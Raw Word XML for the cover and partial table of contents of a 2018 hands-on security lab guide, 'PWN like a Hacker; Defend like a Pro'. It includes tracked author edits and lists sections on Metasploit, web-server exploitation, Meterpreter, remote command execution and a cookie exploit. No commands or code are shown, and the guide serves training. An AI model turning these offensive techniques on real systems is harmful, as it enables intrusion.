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0DC9A" w14:textId="44E2CE49" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="CoverAgility2017"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Agility </w:t>
      </w:r>
      <w:del w:id="0" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidDel="004E3EBC">
          <w:delText xml:space="preserve">2017 </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidR="004E3EBC">
          <w:t>2018</w:t>
        </w:r>
        <w:r w:rsidR="004E3EBC">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>Hands-on Lab Guide</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECBBC0B" w14:textId="7367C625" w:rsidR="00D04158" w:rsidRDefault="001B42DE">
      <w:pPr>
        <w:pStyle w:val="Covertitle"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">ASM </w:t>
      </w:r>
      <w:ins w:id="2" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidR="004E3EBC">
          <w:t>280</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidDel="004E3EBC">
          <w:delText>34</w:delText>
        </w:r>
        <w:r w:rsidR="003C6A6C" w:rsidDel="004E3EBC">
          <w:delText>1</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:r w:rsidR="00615247" w:rsidRPr="00615247">
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00615247">
        <w:t>WN</w:t>
      </w:r>
      <w:r w:rsidR="00615247" w:rsidRPr="00615247">
        <w:t xml:space="preserve"> like a Hacker; Defend like a Pro</w:t>
      </w:r>
      <w:r w:rsidR="00615247">
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F99909" w14:textId="5D517D35" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="Coverpresentedby"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Presented by: </w:t>
      </w:r>
      <w:del w:id="4" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidR="00B9386C" w:rsidDel="004E3EBC">
          <w:delText>Pete</w:delText>
        </w:r>
        <w:r w:rsidR="003C6A6C" w:rsidDel="004E3EBC">
          <w:delText>r</w:delText>
        </w:r>
        <w:r w:rsidR="00B9386C" w:rsidDel="004E3EBC">
          <w:delText xml:space="preserve"> Scheffler</w:delText>
        </w:r>
        <w:r w:rsidR="00260B28" w:rsidDel="004E3EBC">
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00260B28">
        <w:t xml:space="preserve">Chris </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00260B28">
        <w:t>Skibo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:del w:id="5" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidR="00260B28" w:rsidDel="004E3EBC">
          <w:delText>, Paul Weigel, and Matt Burns</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="6" w:author="Peter Scheffler" w:date="2018-08-02T11:35:00Z">
        <w:r w:rsidR="004E3EBC">
          <w:t>, Peter Scheffler</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5A70BA18" w14:textId="5363E298" w:rsidR="00D04158" w:rsidRDefault="00AB6D64">
      <w:pPr>
        <w:pStyle w:val="Whatsinside"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>What’s inside</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A3044B" w14:textId="088CDB0B" w:rsidR="003C6A6C" w:rsidRDefault="00AB6D64">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87296562" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Introduction</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296562 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="45E89C05" w14:textId="1D5DFE51" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296563" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Lab Environment:</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296563 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07B63F71" w14:textId="0A81F5F1" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296564" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Metasploit Overview:</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296564 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="75AC7A6F" w14:textId="391E9BE5" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296565" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Exercise 1 : Scanning the Network</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296565 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74E1F0DA" w14:textId="6D9A2FB3" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296566" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Exercise 2: Exploiting a Web Server</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296566 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>12</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AE1D734" w14:textId="39E094D3" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296567" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Meterpreter</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296567 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6509B10B" w14:textId="064A0242" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296568" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Exercise 3: Metasploit Utilities</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296568 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FD9D3F4" w14:textId="4D9FB7B8" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296569" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Capture The Flag:</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296569 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="22A51321" w14:textId="4A294288" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296570" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Hack and Patch</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296570 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31DBAA83" w14:textId="46FF910F" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296571" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Your First Hack and Patch</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296571 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="53292F0B" w14:textId="09BC6947" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296572" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Useful tools</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296572 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>23</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6DFE8F76" w14:textId="6ACF1D23" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296573" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Completing the CTF</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296573 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59D2933C" w14:textId="204F975B" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296574" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Challenge: Remote Command Execution</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc487296574 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7E6737E4" w14:textId="0AC60CA6" w:rsidR="003C6A6C" w:rsidRDefault="00B46461">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc487296575" w:history="1">
        <w:r w:rsidR="003C6A6C" w:rsidRPr="00484984">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Challenge: Domain Cookie Exploit</w:t>
        </w:r>
        <w:r w:rsidR="003C6A6C">
          <w:rPr>
